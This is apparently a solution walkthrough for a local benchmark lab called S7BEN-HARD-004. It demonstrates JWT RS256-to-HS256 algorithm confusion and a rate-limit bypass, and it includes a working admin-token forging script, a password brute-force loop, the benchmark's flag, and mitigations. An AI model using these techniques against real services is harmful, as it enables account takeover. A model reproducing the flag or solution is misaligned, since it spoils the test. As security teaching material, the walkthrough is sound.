# S7BEN-HARD-004: Comprehensive Testing Guide

## Overview

This benchmark demonstrates JWT algorithm confusion and rate limiting bypass vulnerabilities.

## Environment Setup

```bash
make up
make test
```

## Phase 1: Reconnaissance

### Discover Endpoints

```bash
curl http://localhost/
```

Shows available endpoints:
- `/login` - Rate limited (5 req/min)
- `/api/token` - NOT rate limited
- `/api/jwks` - Public key exposure
- `/admin/flag` - Protected resource

### Test Rate Limiting

```bash
# Try multiple requests to /login
for i in {1..10}; do
  curl -X POST http://localhost/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"user","password":"wrong"}' \
    -w "\nStatus: %{http_code}\n"
done
```

After 5 requests, you'll get HTTP 429 (Too Many Requests).

## Phase 2: Rate Limit Bypass

### Use Alternative Endpoint

```bash
curl -X POST http://localhost/api/token \
  -H 'Content-Type: application/json' \
  -d '{"username":"user","password":"user123"}'
```

This endpoint has NO rate limiting!

Response:
```json
{
  "token": "eyJ...",
  "username": "user",
  "role": "user",
  "note": "This endpoint is not rate limited"
}
```

## Phase 3: JWT Algorithm Confusion

### Understanding the Vulnerability

RS256 (RSA Signature):
- Signs with private key
- Verifies with public key

HS256 (HMAC):
- Signs with secret key
- Verifies with same secret key

**Confusion:** If server accepts both algorithms, attacker can:
1. Get public key (used for RS256 verification)
2. Use public key as HS256 secret
3. Sign malicious token with HS256
4. Server verifies with public key thinking it's RS256

### Get Public Key

```bash
curl http://localhost/api/jwks
```

Save the public key:
```bash
curl -s http://localhost/api/jwks | jq -r '.keys[0].public_key_pem' > public_key.pem
```

### Forge Admin Token

Create `forge_jwt.py`:

```python
#!/usr/bin/env python3
import jwt

# Read public key
with open('public_key.pem', 'r') as f:
    public_key = f.read()

# Create admin payload
payload = {
    'username': 'hacker',
    'role': 'admin',
    'exp': 9999999999
}

# Sign with HS256 using public key as secret
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
```

Run:
```bash
python3 forge_jwt.py > admin_token.txt
```

### Access Admin Endpoint

```bash
TOKEN=$(cat admin_token.txt)

curl http://localhost/admin/flag \
  -H "Authorization: Bearer $TOKEN"
```

Expected response:
```json
{
  "flag": "S7BEN{jwt_alg0_c0nfusion_rs256_to_hs256_xyz789}",
  "message": "Congratulations!",
  "user": "hacker",
  "role": "admin"
}
```

## Understanding JWT Algorithm Confusion

### Why This Works

1. **Server Configuration:**
   - Intended: Use RS256 with RSA keys
   - Vulnerable: Accepts both RS256 and HS256

2. **Attack Flow:**
   ```
   Server expects: JWT signed with PRIVATE key, verify with PUBLIC key (RS256)
   Attacker sends:  JWT signed with PUBLIC key as secret (HS256)
   Server verifies: With PUBLIC key, succeeds!
   ```

3. **Root Cause:**
   ```python
   # VULNERABLE CODE
   jwt.decode(token, public_key, algorithms=['RS256', 'HS256'])

   # SECURE CODE
   jwt.decode(token, public_key, algorithms=['RS256'])  # Only RS256
   ```

### Real-World Examples

**CVE-2015-9235** - JWT library vulnerabilities affected:
- Auth0
- Node.js jsonwebtoken
- Python PyJWT (older versions)
- Ruby jwt gem

**Impact:** Attackers could forge admin tokens for thousands of applications.

## Advanced Techniques

### Brute Force via Non-Rate-Limited Endpoint

```bash
# Brute force passwords using /api/token
for pass in $(cat passwords.txt); do
  curl -X POST http://localhost/api/token \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}" \
    -s | grep -q "token" && echo "Found: $pass"
done
```

### Token Manipulation

Decode token to see structure:
```bash
TOKEN="eyJ..."
echo $TOKEN | cut -d'.' -f2 | base64 -d | jq
```

## Mitigation

### Proper JWT Configuration

```python
# 1. Enforce single algorithm
jwt.decode(token, public_key, algorithms=['RS256'])

# 2. Validate algorithm from token header
header = jwt.get_unverified_header(token)
if header['alg'] != 'RS256':
    raise ValueError("Invalid algorithm")

# 3. Don't expose public keys if not necessary
# 4. Use strong secrets for HS256
# 5. Implement rate limiting on ALL auth endpoints
```

### Rate Limiting Best Practices

```nginx
# Apply to ALL auth endpoints
location ~ ^/(login|api/token|register) {
    limit_req zone=auth_limit burst=5 nodelay;
}
```

## Cleanup

```bash
make down
make clean
```

## Summary

Learned:
- ✅ JWT algorithm confusion attacks
- ✅ RS256 vs HS256 differences
- ✅ Rate limiting bypass techniques
- ✅ Public key as secret exploitation
- ✅ Proper JWT validation
